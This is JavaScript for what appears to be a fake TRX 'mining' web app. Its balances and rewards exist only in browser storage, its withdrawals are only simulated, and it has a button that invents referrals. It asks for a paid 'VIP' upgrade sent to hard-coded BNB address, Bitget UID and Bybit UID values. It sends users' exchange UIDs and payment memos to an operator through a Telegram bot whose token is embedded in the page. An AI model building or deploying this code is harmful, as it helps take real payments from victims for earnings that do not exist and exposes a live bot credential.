// -------------------- Settings (edit these) --------------------
// Paste your Telegram Bot token & admin chat ID (from BotFather / get chat id)
const TELEGRAM_BOT_TOKEN = "8360712858:AAEB13jcCnyhm1UnHsj5fbc2w_2pBPL6L1s"; // example you asked to use
const ADMIN_CHAT_ID = "5550926280"; // your admin chat id

// App constants
const TRX_PRICE_USDT = 0.002;       // 1 TRX = 0.002 USDT
const REWARD_TRX = 5;              // per cycle reward (base)
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
const NEW_ACCOUNT_TRX = 20;        // initial coins for new accounts
const VIP_FEE_USDT = 0.10;         // fee for VIP activation
const VIP_DAILY_USDT = 0.05;       // VIP daily income
const VIP_MULTIPLIER = 50;         // VIP reward multiplier

const BNB_ADDRESS = "0x53f90e7a0d2834b772890f4f456d51aaed61de43";
const BITGET_UID = "9879164714";
const BYBIT_UID  = "269645993";

// -------------------- Local state helpers --------------------
function getState(key, def){
  try { const v = localStorage.getItem(key); return v ? JSON.parse(v) : def; }
  catch(e){ return def; }
}
function setState(key,val){ localStorage.setItem(key, JSON.stringify(val)); }

// default user state
let state = getState('app_state', {
  trx: NEW_ACCOUNT_TRX,      // start coins
  usdt: (NEW_ACCOUNT_TRX * TRX_PRICE_USDT),
  teamCount: 0,
  miningActive: false,
  miningEnd: null,
  isVIP: false,
  vipApprovedList: [], // store approved vip (admin will change manually)
  refId: null
});

// -------------------- DOM nodes --------------------
const pages = { mine: document.getElementById('page-mine'), team: document.getElementById('page-team'), me: document.getElementById('page-me'), vip: document.getElementById('page-vip') };
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const trxAmountEl = document.getElementById('trxAmount');
const meTRX = document.getElementById('meTRX');
const meUSDT = document.getElementById('meUSDT');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineActionBtn = document.getElementById('mineActionBtn');
const mineStatus = document.getElementById('mineStatus');
const mineMessage = document.getElementById('mineMessage');
const refLinkEl = document.getElementById('refLink');
const teamCountEl = document.getElementById('teamCount');
const copyRefBtn = document.getElementById('copyRefBtn');

// modals & actions
const modalConvert = document.getElementById('modalConvert');
const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');
const closeConvert = document.getElementById('closeConvert');

const modalWithdraw = document.getElementById('modalWithdraw');
const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');
const closeWithdraw = document.getElementById('closeWithdraw');

const modalRecharge = document.getElementById('modalRecharge');
const closeRecharge = document.getElementById('closeRecharge');

const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipMsg = document.getElementById('vipMsg');

const mineCycleLabel = document.getElementById('cycleLabel');
const rewardLabel = document.getElementById('rewardLabel');
const priceLabel = document.getElementById('priceLabel');
const speedLabel = document.getElementById('speedLabel');
const vipFeeLabel = document.getElementById('vipFeeLabel');
const bitgetUIDEl = document.getElementById('bitgetUID');
const bybitUIDEl = document.getElementById('bybitUID');

// init UI labels
mineCycleLabel.innerText = (MINING_DURATION_MS/(1000*60*60)) + " hours";
rewardLabel.innerText = REWARD_TRX + " TRX";
priceLabel.innerText = `Price: ${TRX_PRICE_USDT} USDT`;
speedLabel.innerText = `1.5 TRX/H`;
vipFeeLabel.innerText = `${VIP_FEE_USDT.toFixed(2)} USDT`;
if(bitgetUIDEl) bitgetUIDEl.innerText = BITGET_UID;
if(bybitUIDEl) bybitUIDEl.innerText = BYBIT_UID;

// -------------------- Navigation --------------------
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=> {
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    Object.values(pages).forEach(p=>p.classList.remove('active'));
    document.getElementById(target).classList.add('active');
  });
});

// -------------------- Render --------------------
let miningInterval = null;
function renderAll(){
  trxAmountEl.innerText = parseFloat(state.trx).toFixed(2);
  meTRX.innerText = parseFloat(state.trx).toFixed(2);
  meUSDT.innerText = parseFloat(state.usdt).toFixed(2);
  teamCountEl.innerText = state.teamCount;
  // referral link
  if(!state.refId){
    state.refId = Math.random().toString(36).slice(2,10);
    setState('app_state', state);
  }
  refLinkEl.value = `${location.origin}${location.pathname}?ref=${state.refId}`;
  updateMiningUI();
  setState('app_state', state);
}

function updateMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = state.miningEnd - Date.now();
    if(remaining <= 0){
      // finished and ready to claim
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineActionBtn.innerText = `Claim Reward (${calcReward()} TRX)`;
      mineActionBtn.disabled = false;
      mineStatus.innerText = 'Completed';
      mineActionBtn.onclick = collectReward;
      if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
    } else {
      const pct = Math.max(0, Math.min(100, ((MINING_DURATION_MS - remaining)/MINING_DURATION_MS)*100));
      progressInner.style.width = pct + '%';
      const hrs = Math.floor(remaining / (1000*60*60));
      const mins = Math.floor((remaining % (1000*60*60)) / (1000*60));
      const secs = Math.floor((remaining % (1000*60)) / 1000);
      progressTimer.innerText = `Time left: ${hrs}h ${mins}m ${secs}s`;
      mineActionBtn.innerText = 'Mining in progress...';
      mineActionBtn.disabled = true;
      mineStatus.innerText = 'Mining';
      if(!miningInterval){
        miningInterval = setInterval(()=> {
          updateMiningUI();
        },1000);
      }
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineActionBtn.innerText = 'Start Mining';
    mineActionBtn.disabled = false;
    mineStatus.innerText = 'Not started';
    mineActionBtn.onclick = startMining;
    if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
  }
}

// calculate reward (VIP-aware)
function calcReward(){
  let r = REWARD_TRX;
  if(state.isVIP) r = r * VIP_MULTIPLIER;
  return r;
}

// -------------------- Mining actions --------------------
function startMining(){
  if(state.miningActive) return;
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  setState('app_state', state);
  mineMessage.innerText = `Mining started — come back after ${MINING_DURATION_MS/(1000*60*60)} hours to collect.`;
  renderAll();
}

function collectReward(){
  const reward = calcReward();
  // add TRX coins
  state.trx = parseFloat(state.trx) + reward;
  // update USDT balance convert (just for display)
  state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  state.miningActive = false;
  state.miningEnd = null;
  setState('app_state', state);
  mineMessage.innerText = `✅ You collected ${reward} TRX!`;
  // notify admin via Telegram
  sendTelegramMessage(`⛏️ Mining claimed\nUser ref:${state.refId}\nReward: ${reward} TRX\nNew TRX balance: ${state.trx.toFixed(2)}`);
  renderAll();
}

// -------------------- Convert logic --------------------
document.getElementById('openConvert').addEventListener('click', ()=> modalConvert.classList.remove('hidden'));
document.getElementById('closeConvert').addEventListener('click', ()=> modalConvert.classList.add('hidden'));
convertDo.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = v * TRX_PRICE_USDT;
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  setState('app_state', state);
  convertResult.innerText = `Converted ${v} TRX → ${converted.toFixed(6)} USDT`;
  sendTelegramMessage(`🔁 Convert request\nUser ref:${state.refId}\nTRX: ${v}\nUSDT: ${converted.toFixed(6)}`);
  renderAll();
});

// -------------------- Withdraw modal --------------------
document.getElementById('openWithdraw').addEventListener('click', ()=> modalWithdraw.classList.remove('hidden'));
document.getElementById('closeWithdraw').addEventListener('click', ()=> modalWithdraw.classList.add('hidden'));
submitWithdraw.addEventListener('click', ()=>{
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value||0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount <= 0){ alert('Enter withdraw amount'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  // simulate withdraw request
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  setState('app_state', state);
  withdrawMsg.innerText = `Withdraw submitted (${amount.toFixed(6)} USDT) to ${withdrawMethod.value} UID:${uid}`;
  sendTelegramMessage(`💸 Withdraw request\nUser ref:${state.refId}\nMethod:${withdrawMethod.value}\nUID:${uid}\nAmount:${amount.toFixed(6)} USDT`);
  renderAll();
});

// -------------------- Recharge modal --------------------
document.getElementById('openRecharge').addEventListener('click', ()=> modalRecharge.classList.remove('hidden'));
document.getElementById('closeRecharge').addEventListener('click', ()=> modalRecharge.classList.add('hidden'));

// -------------------- VIP submit --------------------
vipSubmit.addEventListener('click', ()=>{
  const exchange = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!sender || !memo){ alert('Enter UID and transaction ID / memo'); return; }
  // Prepare summary and send to admin via Telegram
  let summary = `🌟 VIP Request\nUser ref:${state.refId}\nExchange:${exchange}\nSender UID:${sender}\nMemo:${memo}\nFee:${VIP_FEE_USDT} USDT\n`;
  sendTelegramMessage(summary + '\n(Submit includes screenshot if provided)');
  // If file exists, try to upload image as Base64 and send as photo via bot (optional)
  if(file){
    const reader = new FileReader();
    reader.onload = function(e){
      // send as Telegram photo (using sendPhoto requires file upload — impossible w/o server).
      // Instead notify admin that proof is available and store in localStorage (demo)
      const key = `vip_proof_${state.refId}_${Date.now()}`;
      setState(key, e.target.result);
      vipMsg.innerText = 'Proof saved (demo). Admin will check and activate VIP.';
    };
    reader.readAsDataURL(file);
  } else {
    vipMsg.innerText = 'VIP request submitted (demo). Admin will review.';
  }
  // store request locally
  const requests = getState('vip_requests', []);
  requests.push({ref: state.refId,exchange,sender,memo,time:Date.now()});
  setState('vip_requests', requests);
  renderAll();
});

// -------------------- Fake invite / copy ref --------------------
document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
  state.teamCount = parseInt(state.teamCount) + 1;
  setState('app_state', state);
  renderAll();
});
copyRefBtn.addEventListener('click', ()=>{
  navigator.clipboard && navigator.clipboard.writeText(refLinkEl.value);
  alert('Referral link copied.');
});

// -------------------- Telegram send (simple) --------------------
function sendTelegramMessage(message){
  if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.log('Telegram token or admin ID missing. Message:', message);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method:'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' })
  }).then(r=>r.json())
    .then(j=> console.log('tg ok', j))
    .catch(e=> console.error('tg err', e));
}

// -------------------- Startup restore --------------------
(function init(){
  // ensure consistent numeric types
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt);
  if(getState('miningActive', false) && getState('miningEnd', null)){
    // restore if present (backwards compat)
    state.miningActive = getState('miningActive', state.miningActive);
    state.miningEnd = getState('miningEnd', state.miningEnd);
  }
  renderAll();
})();
